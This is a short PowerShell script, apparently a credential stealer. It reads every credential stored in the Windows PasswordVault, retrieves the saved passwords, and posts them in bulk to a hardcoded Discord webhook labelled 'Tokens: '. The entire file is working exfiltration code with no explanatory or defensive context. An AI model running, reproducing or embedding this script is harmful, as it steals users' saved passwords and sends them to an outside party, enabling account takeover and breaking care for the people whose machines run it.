
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }

$hookUrl = 'https://discord.com/api/webhooks/889662758910574662/aHaHRR3GFmiFr-wD8-RfDzrlfZIOv8P1u-SQL6qrdQmHh3is9s1ZHcL1qxRcd1kDRaYM'

$Body = @{
  'username' = 'Tokens: '
  'content' = $vault.RetrieveAll() | Format-Table -HideTableHeaders | Out-String
}
Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body